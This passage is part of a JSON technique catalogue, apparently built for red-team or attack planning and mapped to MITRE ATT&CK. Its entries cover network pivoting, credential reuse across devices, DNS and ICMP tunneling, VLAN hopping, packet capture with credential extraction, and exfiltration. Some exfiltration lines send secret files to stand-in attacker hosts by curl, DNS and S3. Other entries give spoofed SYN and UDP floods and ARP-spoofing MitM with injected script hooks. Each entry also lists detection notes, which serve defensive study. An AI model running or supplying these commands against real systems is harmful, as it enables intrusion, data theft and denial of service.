        "nmap -sT -Pn --top-ports 100 192.168.1.0/24",
        "# Windows - show DNS cache",
        "ipconfig /displaydns",
        "# Linux - show DNS cache (systemd-resolved)",
        "resolvectl statistics",
        "# Identify SMB connections",
        "smbclient -L //192.168.1.1 -N",
        "# Show NetBIOS connections",
        "nmblookup -A 192.168.1.1"
      ]
    },
    {
      "id": "NET-LATERAL-001",
      "mitre_id": "T1599.001",
      "name": "Network Pivoting",
      "phase": "lateral_movement",
      "infrastructure": "network",
      "description": "Pivot through compromised hosts to access other network segments",
      "prerequisites": ["Compromised host with multi-homed access"],
      "tools": ["Proxychains", "Chisel", "sshuttle", "Ligolo"],
      "detection": "Unusual traffic patterns, proxy detection",
      "references": ["https://attack.mitre.org/techniques/T1599/001/"],
      "next_techniques": ["NET-RECON-001", "NET-LATERAL-003"],
      "risk_level": "high",
      "commands": [
        "# SSH local port forwarding",
        "ssh -L 8080:192.168.2.1:80 user@192.168.1.1",
        "# SSH dynamic SOCKS proxy",
        "ssh -D 1080 user@192.168.1.1",
        "# Configure proxychains for SOCKS proxy",
        "# Edit /etc/proxychains.conf: socks5 127.0.0.1 1080",
        "# Use proxychains to scan through pivot",
        "proxychains nmap -sT -Pn 192.168.2.0/24",
        "# Chisel server (on attacker)",
        "chisel server --reverse --port 8000",
        "# Chisel client (on pivot host)",
        "chisel client ATTACKER_IP:8000 R:1080:socks",
        "# sshuttle - VPN over SSH",
        "sshuttle -r user@192.168.1.1 192.168.2.0/24",
        "# Ligolo-ng server (on attacker)",
        "ligolo-proxy -selfcert",
        "# Ligolo-ng agent (on pivot host)",
        "ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert",
        "# Metasploit autoroute",
        "meterpreter > run autoroute -s 192.168.2.0/24",
        "# Metasploit SOCKS proxy",
        "use auxiliary/server/socks_proxy; set SRVPORT 1080; run",
        "# rpivot for reverse SOCKS proxy",
        "# Server: python server.py --server-port 9999\\n# Client: python client.py --server-ip ATTACKER_IP --server-port 9999"
      ]
    },
    {
      "id": "NET-LATERAL-002",
      "mitre_id": "T1021",
      "name": "Network Device Hopping",
      "phase": "lateral_movement",
      "infrastructure": "network",
      "description": "Move between network devices using captured credentials",
      "prerequisites": ["Network device credentials"],
      "tools": ["SSH", "Device CLI", "SNMP"],
      "detection": "Device access logs, unusual admin sessions",
      "references": ["https://attack.mitre.org/techniques/T1021/"],
      "next_techniques": ["NET-CRED-001"],
      "risk_level": "high",
      "commands": [
        "# SSH to multiple devices with same credentials",
        "for ip in 192.168.1.{1..10}; do ssh admin@$ip 'show version'; done",
        "# Telnet device hopping",
        "telnet 192.168.1.2",
        "# SNMP-based device access",
        "snmpwalk -v2c -c captured_community 192.168.1.2",
        "# Cisco - SSH from device to device",
        "ssh -l admin 192.168.1.2",
        "# Use captured Type 7 passwords",
        "# Decrypt: python cisco_pwdecrypt.py -> use on next device",
        "# CrackMapExec for credential reuse across network",
        "crackmapexec ssh 192.168.1.0/24 -u admin -p 'CapturedP@ss'",
        "# Ansible for mass device access",
        "ansible all -i 'device1,device2,device3,' -m raw -a 'show version'",
        "# Netmiko batch commands",
        "# Python script to iterate through devices with captured creds",
        "# TACACS credential reuse",
        "# If TACACS server compromised, use creds on all devices",
        "# Jump through devices using SSH ProxyJump",
        "ssh -J user@192.168.1.1 user@192.168.2.1"
      ]
    },
    {
      "id": "NET-LATERAL-003",
      "mitre_id": "T1572",
      "name": "Protocol Tunneling",
      "phase": "lateral_movement",
      "infrastructure": "network",
      "description": "Tunnel traffic through allowed protocols to bypass network controls",
      "prerequisites": ["Compromised host"],
      "tools": ["DNS tunneling", "ICMP tunneling", "HTTP tunneling"],
      "detection": "DNS analytics, traffic anomaly detection",
      "references": ["https://attack.mitre.org/techniques/T1572/"],
      "next_techniques": ["NET-EXFIL-001"],
      "risk_level": "high",
      "commands": [
        "# DNS tunneling with iodine - server",
        "iodined -f -c -P password 10.0.0.1 tunnel.domain.com",
        "# DNS tunneling with iodine - client",
        "iodine -f -P password tunnel.domain.com",
        "# dnscat2 server",
        "dnscat2-server tunnel.domain.com",
        "# dnscat2 client",
        "dnscat2 tunnel.domain.com",
        "# ICMP tunneling with icmptunnel - server",
        "icmptunnel -s",
        "# ICMP tunneling with icmptunnel - client",
        "icmptunnel 192.168.1.1",
        "# HTTP tunneling with Chisel",
        "# Server: chisel server -p 80 --reverse\\n# Client: chisel client http://ATTACKER_IP R:socks",
        "# WebSocket tunneling",
        "wstunnel -L 8080:localhost:22 ws://allowed-server.com",
        "# SSH over HTTP with corkscrew",
        "ssh -o ProxyCommand='corkscrew proxy.company.com 8080 %h %p' user@external.com",
        "# ngrok for tunneling out",
        "ngrok tcp 22",
        "# Stunnel for SSL wrapping",
        "stunnel /etc/stunnel/stunnel.conf"
      ]
    },
    {
      "id": "NET-LATERAL-004",
      "mitre_id": "T1563.001",
      "name": "VLAN Hopping",
      "phase": "lateral_movement",
      "infrastructure": "network",
      "description": "Hop between VLANs to access segmented network areas",
      "prerequisites": ["Access to trunk port or DTP-enabled port"],
      "tools": ["Yersinia", "Scapy", "VLAN hopping tools"],
      "detection": "802.1Q tag monitoring, switch port security",
      "references": ["https://attack.mitre.org/techniques/T1563/001/"],
      "next_techniques": ["NET-DISC-001"],
      "risk_level": "high",
      "commands": [
        "# Yersinia DTP attack to negotiate trunk",
        "yersinia dtp -attack 1 -interface eth0",
        "# Yersinia 802.1Q double tagging attack",
        "yersinia dot1q -attack 1 -interface eth0",
        "# Create 802.1Q VLAN interface (Linux)",
        "ip link add link eth0 name eth0.100 type vlan id 100",
        "ip addr add 192.168.100.10/24 dev eth0.100",
        "ip link set eth0.100 up",
        "# Scapy double encapsulation attack",
        "# sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst='192.168.100.1')/ICMP())",
        "# frogger VLAN hopping tool",
        "frogger -i eth0 -v 100",
        "# voiphopper for VoIP VLAN access",
        "voiphopper -i eth0 -c 0",
        "# Enable trunk mode manually (if access to switch)",
        "config t -> interface Gi0/1 -> switchport mode trunk -> switchport trunk encapsulation dot1q",
        "# Verify VLAN access",
        "ping 192.168.100.1",
        "# Scan new VLAN",
        "nmap -sn 192.168.100.0/24"
      ]
    },
    {
      "id": "NET-COLL-001",
      "mitre_id": "T1040",
      "name": "Traffic Capture and Analysis",
      "phase": "collection",
      "infrastructure": "network",
      "description": "Capture and analyze network traffic for sensitive data extraction",
      "prerequisites": ["Network access, packet capture capability"],
      "tools": ["Wireshark", "tcpdump", "NetworkMiner"],
      "detection": "Promiscuous mode detection, span port monitoring",
      "references": ["https://attack.mitre.org/techniques/T1040/"],
      "next_techniques": ["NET-EXFIL-001"],
      "risk_level": "medium",
      "commands": [
        "# Tcpdump full packet capture",
        "tcpdump -i eth0 -w full_capture.pcap",
        "# Tcpdump capture specific host traffic",
        "tcpdump -i eth0 host 192.168.1.100 -w host_traffic.pcap",
        "# Tcpdump capture HTTP traffic with content",
        "tcpdump -i eth0 -A -s 0 'tcp port 80'",
        "# Wireshark CLI - capture with ring buffer",
        "tshark -i eth0 -b duration:3600 -b files:24 -w hourly_capture.pcap",
        "# Extract HTTP objects from pcap",
        "tshark -r capture.pcap --export-objects http,./http_objects/",
        "# Extract files from SMB traffic",
        "tshark -r capture.pcap --export-objects smb,./smb_objects/",
        "# NetworkMiner for automated extraction",
        "mono NetworkMiner.exe capture.pcap",
        "# Extract credentials from pcap with PCredz",
        "python Pcredz.py -f capture.pcap",
        "# Analyze pcap for cleartext passwords",
        "tshark -r capture.pcap -Y 'ftp.request.command == PASS || http.authbasic' -T fields -e text",
        "# Extract DNS queries",
        "tshark -r capture.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name | sort -u",
        "# Capture and analyze SSL/TLS handshakes",
        "tshark -r capture.pcap -Y 'ssl.handshake.type == 1' -T fields -e ip.src -e ssl.handshake.extensions_server_name"
      ]
    },
    {
      "id": "NET-EXFIL-001",
      "mitre_id": "T1048",
      "name": "Exfiltration Over Alternative Protocol",
      "phase": "exfiltration",
      "infrastructure": "network",
      "description": "Exfiltrate data using covert channels like DNS, ICMP, or encrypted tunnels",
      "prerequisites": ["Network access", "Covert channel established"],
      "tools": ["dnscat2", "iodine", "Encrypted tunnels"],
      "detection": "DNS query analysis, protocol anomalies, DLP",
      "references": ["https://attack.mitre.org/techniques/T1048/"],
      "next_techniques": [],
      "risk_level": "high",
      "commands": [
        "# DNS exfiltration with dnscat2",
        "# Server: dnscat2-server tunnel.domain.com\\n# Client: dnscat2 --dns server=ATTACKER_IP tunnel.domain.com",
        "# DNS exfiltration with simple base64 encoding",
        "cat secret.txt | base64 | while read line; do nslookup $line.exfil.domain.com; done",
        "# ICMP exfiltration with hping3",
        "hping3 -1 -E secret.txt -u -d 100 192.168.1.100",
        "# ICMP tunnel with icmpsh",
        "# Attacker: python icmpsh_m.py ATTACKER_IP TARGET_IP\\n# Target: icmpsh.exe -t ATTACKER_IP",
        "# Exfiltration over HTTPS (encrypted)",
        "curl -X POST -d @secret.txt https://attacker.com/exfil --insecure",
        "# Exfiltration over DNS TXT records",
        "for chunk in $(cat secret.txt | base64 | fold -w 63); do dig TXT $chunk.data.domain.com; done",
        "# PacketWhisper for steganographic exfiltration",
        "python packetwhisper.py -t dns -m transmit -f secret.txt",
        "# Exfiltration via NTP",
        "# Encode data in NTP packets to allowed NTP server",
        "# Exfiltration via allowed cloud services",
        "aws s3 cp secret.txt s3://attacker-bucket/ --profile stolen_creds",
        "# Slow exfiltration to avoid detection",
        "split -b 1k secret.txt chunk_ && for f in chunk_*; do curl -d @$f https://attacker.com/exfil; sleep 60; done"
      ]
    },
    {
      "id": "NET-IMPACT-001",
      "mitre_id": "T1498",
      "name": "Network Denial of Service",
      "phase": "impact",
      "infrastructure": "network",
      "description": "Launch DDoS or resource exhaustion attacks against network infrastructure",
      "prerequisites": ["Network access", "Attack infrastructure"],
      "tools": ["DDoS tools", "Traffic generators"],
      "detection": "Traffic monitoring, DDoS protection alerts",
      "references": ["https://attack.mitre.org/techniques/T1498/"],
      "next_techniques": [],
      "risk_level": "critical",
      "commands": [
        "# WARNING: DoS attacks should only be performed in authorized testing environments",
        "# hping3 SYN flood",
        "hping3 -S --flood -V -p 80 192.168.1.1",
        "# hping3 with spoofed source",
        "hping3 -S --flood --rand-source -p 80 192.168.1.1",
        "# Slowloris HTTP slow attack",
        "slowloris 192.168.1.1 -p 80 -s 500",
        "# LOIC (Low Orbit Ion Cannon) style attack",
        "# Multiple concurrent TCP connections to exhaust resources",
        "# UDP flood",
        "hping3 --udp --flood -p 53 192.168.1.1",
        "# DNS amplification (requires open resolvers)",
        "# Send spoofed DNS queries to amplify attack",
        "# NTP amplification",
        "# Exploit monlist command on NTP servers",
        "# Memcached amplification",
        "# Exploit memcached UDP reflection",
        "# TCP connection exhaustion",
        "nmap -sT -p 80 --min-rate 100000 192.168.1.1",
        "# Application layer DoS",
        "ab -n 100000 -c 1000 http://192.168.1.1/"
      ]
    },
    {
      "id": "NET-IMPACT-002",
      "mitre_id": "T1565.002",
      "name": "Network Traffic Manipulation",
      "phase": "impact",
      "infrastructure": "network",
      "description": "Modify network traffic to corrupt data or redirect communications",
      "prerequisites": ["MitM position"],
      "tools": ["Ettercap", "Bettercap", "Scapy"],
      "detection": "Integrity monitoring, certificate validation",
      "references": ["https://attack.mitre.org/techniques/T1565/002/"],
      "next_techniques": [],
      "risk_level": "high",
      "commands": [
        "# Ettercap with filter to modify HTTP content",
        "# Create filter file: etterfilter inject.filter -o inject.ef\\n# ettercap -T -q -F inject.ef -M arp:remote /192.168.1.100// /192.168.1.1//",
        "# Bettercap with HTTP proxy",
        "bettercap -iface eth0 -eval 'set http.proxy.injectjs alert(1); http.proxy on; arp.spoof on'",
        "# mitmproxy with modification script",
        "mitmproxy -s modify_response.py",
        "# Scapy packet manipulation",
        "# from scapy.all import *; pkt=IP()/TCP()/Raw(load='modified'); send(pkt)",
        "# DNS response modification",
        "dnsspoof -i eth0 -f hosts.txt",
        "# Inject malicious content into HTTP responses",
        "# Use BeEF hook in Bettercap: set http.proxy.injectjs <script src='http://attacker/hook.js'></script>",
        "# TCP session hijacking with hunt",
        "hunt -i eth0",
        "# Inject into existing TCP session with Scapy",
        "# Craft packet with correct seq/ack numbers and inject",
        "# BGP hijacking (requires BGP access)",
        "# Announce false routes to redirect traffic",
        "# ARP cache poisoning for persistent MitM",
        "arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 & arpspoof -i eth0 -t 192.168.1.1 192.168.1.100"
      ]
    }
  ]
}
